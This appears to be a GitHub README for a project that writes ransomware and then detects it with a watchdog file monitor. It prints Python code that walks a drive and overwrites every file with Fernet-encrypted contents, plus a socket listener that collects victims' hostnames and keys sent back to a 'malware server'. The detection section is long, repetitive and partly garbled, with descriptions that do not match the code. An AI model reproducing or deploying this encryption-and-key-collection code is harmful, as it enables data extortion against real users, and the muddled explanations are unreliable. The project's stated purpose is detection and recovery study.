# Rocket
<img src="main.gif" align="right" />

**Ransomware** is a type of `cryptovirology` that threatens to publish the victims personal data or permanently block access unless a ransome is *paid*.

**Cryptovirology** refers to the use of cryptography to devise particularly powerful malware, such as `ransomware` and `asymmetric backdoors`.

**Cryptography** and it's applications are *defensive* in nature and provide privacy, authentication and security to users. Cryptovirology employs a twist on cryptography showing that it can be used *offensively*.

In a properly implemented cryptoviral extortion attack, recorvering the files without the decryption key is an intractable problem and difficult to trace digital currencies such as `PaysafeCard` or `Bitcoin` and other cryptocurrencies are used for the ransoms, making tracing and prosecuting the perpetrators difficult.

`Ransomware` attacks are typically carried out using a **Trojan** disguised as a legitimate file that the user is tricked into downloading or opening when it arrives as an *email attachment*, or *embedded link in a phishing email*.

## REQUIREMENTS

🌟 Before we start, let's install the packages via pip by running in the terminal (Python3 Modules required to run the script):

Example
>- pip install watchdog

:point_right: pandas

:point_right: os

:point_right: datetime

:point_right: thread

:point_right: queue

:point_right: fernet

:point_right: socket

:point_right: path

:point_right: tkinter

:point_right: watchdog


## THE PROCESSES INVOLVED

- Infection: Attackers deliver the malware Payload to the target.

- Security Key Exchange: Attackers are notified they have the victim.

- Encryption: Ransomware encrypts the victim's file.

- Extortion: Attacker sends the ransome note and payment request.

- Recovery/Restore: Payment is sent in exchange for the decryption key.


## TYPES OF RANSOMWARE

- Crypto Ransomware: This type of ransomware encrypts files on a computer so that the user looses access to essential files. This is the type to be used for this project.
Examples of CryptoRansomware:
>- BadRabbit
>- Cryptolocker
>- SamSam
>- Thanos

- Locker Ransomware: This type of ransomware locks victims out of their device and prevents them from using their device. 
Examples are:
>- NotPetya and Petya
>- Ryuk
>- WannaCry


# PROJECT PLAN

**PROJECT:** Ransomware to detect, decrypt and restore.
```
Step 1: Create a code for ransomware (Encryption).
To be able to detect, there has to be a running process, and an encrypted file/drive path containing files.
We will encrypt all files at a given directory and transmit the user's hostname and random 512 bit key back to the malware server.

Step 2: Detection.
Detection would work on identifying running malware processes. Other methods of detection includes:

>- Honeypots > Monitored traps for a defender often used as a decoy to lure cyber attackers, to detect, deflect, and study hacking attempts to gain unauthorized access to information systems.
>- ML >   Machine Learning
>- Signature > File Entrophy
>- File Hash Comparism

Step 3: Decryption and Recovery.
This step involves the decryptor asking the victim for the key that was generated on their device/machine. Only the hacker will have this key, so they must retrieve it from him/her. 
```
> Note: We know that there are libraries that uses the *AES* encryption with just a few function calls, but we are doing this manually.


# STEPS EXPLANATION
- **STEP 1:** 
    
    ## ENCRYPTION
    >- :point_right: **Fetch files** to be encrypted from the specified drive (*In this case we specified a flash drive*).
    We'll use the os.walk() function from the os library, which, given a path, iterates over every possible path in the form of a tree, to get a list of the files         that need to be encrypted. 
    >- :point_right: After that, we **used pandas to specify unique extentions**.
    >- :point_right: **Obtain the drive's whole list of files along with their extensions**. To obtain a list of the files that require encryption, we'll use the os.walk() function from the os package, which, given a path, iterates through every potential path in the form of a tree. The following usage is described below:
    ```
    ListFiles = os.walk(str ('E:'))
    SplitTypes = []
    for walk_output in ListFiles:
        for file_name in walk_output[-1]:
            SplitTypes.append(str('.')+file_name.split(".")[-1])
    SplitTypes
    df = pd.DataFrame(SplitTypes, columns = ['extension_names'])
    ```
    >- :point_right: **Encryption:** Data encryption and decryption are made possible by Python's support for a cryptography module. The cryptography package's fernet module has built-in functions for generating keys, converting plaintext to ciphertext, and recovering plaintext from ciphertext using the encrypt and decrypt methods, respectively. The fernet module ensures that information encrypted with it cannot be changed or decrypted without the key.
    ```
    def encrypt(key):
    while q.not_empty:
        file = q.get()
        print(f'Encrypting {file}')
        print(f'{file} SUCCESSFULLY ENCRYPTED')   
        try:
            with open('thekey.key', 'wb') as thekey:
                thekey.write(key)
            for file in file_paths:
                with open(file, 'rb') as thefile:
                    contents = thefile.read()
                contents_encrypted = Fernet(key).encrypt(contents)
                with open(file, 'wb') as thefile:
                    thefile.write(contents_encrypted)
        except: # files with admin priviledges are skipped
            print('ENCRYPTION FAILED')
        q.task_done()
    ```
    
    >- :point_right:**server implementation:**
    The bit key that will be used to encrypt all files is first generated by the ransomware. It will then compile a list of all the necessary files and encrypt them all before sending the key and the hostname of the machine to the server.
    ```
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((ipaddr, port))
    print('Listening for connections.........')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established!')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')   
            break
        print('Connection completed and closed!')  
    ```

https://user-images.githubusercontent.com/96830808/204082752-fe52e5bf-5c1b-491d-9a31-c94f005e7132.mp4

- **STEP 2:**
    
    ## DETECTION
    :point_right: For detection, `Watchdog` — a software that keeps track of all file creation, modification (ENCRYPTION), renaming, deletion in a certain path—has been developed. Two of these features—file modification and renaming—will be used by us.

    `WATCHDOG` is a cross-platform Python package that enables enables us to keep track of file system activity in real time. If we want the software to carry out an action whenever a file is edited, destroyed, relocated, etc., it is quite helpful for automating activities.
 >- The code starts by importing the pathlib module.
 >- This is a library that provides methods for manipulating paths and directories.
 >- The Path class in this module can be used to create new paths, or it can be used as a context manager to ensure that changes made inside of it are not written outside of it.
 >- The next line imports the ttk package which contains classes for creating graphical user interfaces with Tkinter .
 >- Next, we import datetime , queue , and pygame .
 >- These are all libraries that provide useful functions for working with dates and times, queues, and graphics respectively.
 >- Next comes an empty function called MyEventHandler() which will serve as our event handler class.
 It's important to note here that this class inherits from FileSystemEventHandler because file system events are what we're interested in handling at the moment.
 We'll get into more detail about how these events work later on when we talk about how they're triggered using Python's built-in event loop mechanism (i.e., through callbacks).
 For now though just know that FileSystemEventHandler is a base class provided by watchdog which handles most common file system events such as creation/deletion/modification/moved etc...
 The code is a simple example of how to create an event handler in Python.
 
 >- The first line creates the class MyEventHandler, which inherits from FileSystemEventHandler.
 >- The next line initializes the instance of this class with q being the queue that was passed in when it was created.
 >- The last two lines are self-explanatory and are not relevant for this tutorial.
 >- The code starts by creating a class called Queue.
 It then creates an instance of the class and assigns it to self._q, which is a reference to the queue.
 >- The code then calls super().__init__() in order to call the parent's constructor for any objects that are inherited from this class.
 >- The on_any_event function will be executed whenever there is an event with one of these names: Created, Deleted, Modified, or Moved.
 >- In order to figure out what type of event has occurred, we use action = {EVENT_TYPE_CREATED: "Created", EVENT_TYPE_DELETED: "Deleted", EVENT_TYPE_MODIFIED: "Modified", EVENT_TYPE _MOVED: "Moved"}[event.eventType].
 We can see that each key-value pair corresponds with one of these events types and contains information about what happened during that particular event (e.g., if you deleted something).
 The code is a good example of how to use the `super()` function in Python.
 The `super()` function allows us to call a method from our parent class without having to explicitly pass it as an argument.
 >- The code starts by checking if the event is a movement.
 If it is, then the destination path of that movement will be appended to action.
 >- The code also checks if the event type is **EVENT_TYPE_MODIFIED** and plays music accordingly,  If it is an event type of MODIFIED, then pygame's mixer library will be initialized and music from ./alarm.mp3 will load into memory before playing through pygame's mixer library with the command play().

 >- The code above will first check if there is an event that has been triggered.
 If there is, it will then check what type of event it is and act accordingly.
 >- The code starts by creating a new instance of the ProcessEvents class.
 >- This is done with the following line: ProcessEvents(observer, q, modtree) The next line creates an event handler for when files are modified.
 >- The code then sets up a loop that will run in the main thread and call process_events() every time it runs through it.
 >- For each file that is changed, this function calls put() on the observer object to send information about what was changed and where it happened to another object called q .
 >- Finally, datetime.datetime objects are created using strftime() , which formats them as human-readable dates and times.
 The code is used to process events from the event queue.
 The code above is executed in a secondary thread, so it cannot modify a Tk widget from the main thread.
 The code starts by checking to see if the observer is still running.
 If it isn't, then the code returns.
 >- Next, the code tries to get an event from the queue.
 >- If there is no event in the queue, then nothing happens and we just continue on with our program.
 Otherwise, we will append a new item into our treeview at position 0 and set its text value to be whatever was retrieved from that event (new_item[0]).
 >- The modtree object has a method called insert() which takes two parameters: 1) where in the treeview this new node should go 2) what type of data should be stored for this node 3) what values should be stored for each of those items
 >- The code attempts to allow the observer to be updated with new events.
 >- The code begins by checking if the observer is alive or not.
 >- If it isn't, then there is nothing for the code to do.
 >- If it is, then a try block will check if there are any events in the queue.
 >- If there aren't any events in the queue, then this means that no new updates have occurred and so we continue on with our program as normal.
 >- However, if an event was retrieved from the queue, then we'll insert it into a treeview at position 0 and append text=new_item[0] to its values property which contains whatever value of item was inserted into that particular spot in the treeview.
 
 >- The code starts by creating a tk.Tk() object and configuring it to have a width of 600 pixels and height of 500 pixels.
 >- Next, the code creates an empty columnconfigure(0, weight=1) for the first row in the grid layout.
 The next line is where we create our Treeview widget with columns set up as "action", "time", which will display information about what happened on this computer when it was running this program.
 The next line is where we create our modtree widget with heading("#0", text="File") so that it can be used later to show us what files were opened or closed during this time period.
 Then there's another heading("action", text="Action") followed by another heading("time", text="Time").
 Finally, there's a sticky="nsew" option for each column so that they stay put if you click them (sticky means they won't move).
 The code is used to create a treeview with two columns and three rows.
 The first column will contain the action, the second column will contain the time, and the third row will be empty.
 The code above then creates an observer object that contains an event handler function called process_events() which is run every 500 milliseconds.
 The code starts by creating an event observer.
 The code then creates a queue that will act as a communication channel between the observer and the Tk application.
 >- Next, it schedules two different handlers to be called when events occur on local drive C: OR E: (on Windows).
 Then, it starts the event observer.
 >- The first handler is MyEventHandler(q), which takes in one argument - q - which is the queue created earlier.
 >- This function monitors all events on local drive C: OR E: (on Windows) and calls MyEventHandler(q), passing in "E:\" for its second argument if recursive=True; otherwise, it passes in "."
 for its second argument if recursive=False
 >- The code creates a new event observer, and schedules the MyEventHandler to be called every time an event occurs on the local drive C: OR E: (on Windows).
 >- The code also schedules the MyEventHandler to be called when events occur on other drives.



https://user-images.githubusercontent.com/96830808/205476537-2ed8a910-90c0-4e65-bb07-3a758b7fb36e.mp4





# REFERENCES
- https://pythonassets.com/posts/detecting-changes-in-the-file-system-in-real-time-with-watchdog/
- 
